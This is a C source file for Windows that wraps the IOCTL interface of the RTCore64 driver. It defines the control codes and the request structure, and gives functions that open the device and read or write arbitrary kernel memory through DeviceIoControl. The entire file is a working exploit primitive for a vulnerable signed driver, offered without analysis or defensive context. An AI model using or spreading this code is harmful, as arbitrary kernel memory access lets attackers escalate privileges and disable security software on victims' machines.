#include <windows.h>

#define RTCORE64_MEMORY_READ_CODE 0x80002048
#define RTCORE64_MEMORY_WRITE_CODE 0x8000204C


typedef struct _RTCORE64_MEMORY_READ_WRITE
{
	BYTE unknown0[8];
	DWORD64 address;
	BYTE unknown1[8];
	DWORD size;
	DWORD value;
	BYTE unknown2[16];
	
} RTCORE64_MEMORY_READ_WRITE, *PRTCORE64_MEMORY_READ_WRITE;

int rtcore64_open_device(const CHAR* driver_symlink, HANDLE *device_handle)
{
	*device_handle = CreateFileA(driver_symlink, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(*device_handle == INVALID_HANDLE_VALUE) return 1;

	return 0;
}

int rtcore64_read_memory(HANDLE device_handle, DWORD64 address_64, DWORD size, DWORD *value)
{
	*value = 0;

	RTCORE64_MEMORY_READ_WRITE rtcore_64memory_readwrite;
	memset(&rtcore_64memory_readwrite, 0, sizeof(RTCORE64_MEMORY_READ_WRITE));
	rtcore_64memory_readwrite.address = address_64;
	rtcore_64memory_readwrite.size = size;

	DWORD bytes_returned;
	if(DeviceIoControl
        (
            device_handle,
            RTCORE64_MEMORY_READ_CODE,
            &rtcore_64memory_readwrite, 
            sizeof(RTCORE64_MEMORY_READ_WRITE), 
            &rtcore_64memory_readwrite, 
            sizeof(RTCORE64_MEMORY_READ_WRITE), 
            &bytes_returned, 
            NULL
        ) == FALSE) return 1;

	*value = rtcore_64memory_readwrite.value;

	return 0;
}

int rtcore64_write_memory(HANDLE device_handle, DWORD64 address_64, DWORD size, DWORD value)
{
	RTCORE64_MEMORY_READ_WRITE rtcore_64memory_readwrite;
	memset(&rtcore_64memory_readwrite, 0, sizeof(RTCORE64_MEMORY_READ_WRITE));
	rtcore_64memory_readwrite.address = address_64;
	rtcore_64memory_readwrite.size = size;
	rtcore_64memory_readwrite.value = value;

	DWORD bytes_returned;
	if(DeviceIoControl
		(
			device_handle,
			RTCORE64_MEMORY_WRITE_CODE,
			&rtcore_64memory_readwrite,
			sizeof(RTCORE64_MEMORY_READ_WRITE),
			&rtcore_64memory_readwrite,
			sizeof(RTCORE64_MEMORY_READ_WRITE),
			&bytes_returned,
			NULL
		) == FALSE) return 1;

	return 0;
}